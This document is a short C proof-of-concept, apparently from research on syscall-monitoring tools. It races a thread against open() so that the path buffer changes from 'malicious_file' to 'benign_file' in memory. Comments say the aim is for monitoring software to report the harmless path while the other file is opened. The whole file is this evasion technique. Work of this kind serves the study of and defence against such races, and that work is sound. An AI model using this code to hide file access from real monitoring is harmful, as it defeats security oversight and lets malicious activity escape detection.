#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
/* file flag */
#include <fcntl.h>
/* mmap */
#include <sys/mman.h>
/* string */
#include <string.h>
/* compile without -m32 for 64 bit call numbers */
#include <asm/unistd.h>      
#include <string.h>

#define BUSYLOOP_COUNT 3200000

#define FORCE_INLINE __attribute__((always_inline)) inline

#define handle_error_en(en, msg) \
  do { errno = en; perror(msg); exit(EXIT_FAILURE); } while (0)


static int page_size;
// the intended file to open, this can be anywhere you mount the fusefs file path
static volatile char page[] = "/root/droplet/malicious_file";

static inline void 
busyloop(int overwrite_delay) 
{
  for (int i = 0; i < overwrite_delay; i++) {
    __asm__ volatile("" : "+g" (i) : :);
  }
}

/* simplified strcpy */
static volatile void 
write_char(char *string, int len) 
{
  for(int i = 0; i < len; i++) {
    page[i] = string[i];
  }
}

static void *
thread_start(void *arg)
{
  // let monitoring software report a local path 
  //char fakename[] = "benign_file";
  // can also pick the path in the fusefs path
  char fakename[] = "/root/droplet/benign_file";
  
  asm volatile("mfence");
  write_char(fakename, sizeof(fakename));
  asm volatile("mfence");
}


int
main(int argc, char *argv[]) 
{
  int s;
  pthread_t thread;

  /* start new thread */
  s = pthread_create(&thread, NULL, &thread_start, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_create");

  /* busy delay */
  /* syscall openat */
  int myfd = 0;
  //busyloop(BUSYLOOP_COUNT);
  myfd = open(page, O_CREAT|O_RDWR|O_DIRECT, 0640);
  if (myfd < 0) 
    handle_error_en(myfd, "open failure");
 
  /* wait for thread to finish */
  s = pthread_join(thread, NULL);
  if (s != 0)
    handle_error_en(s, "pthread_join");
  exit(EXIT_SUCCESS);
}
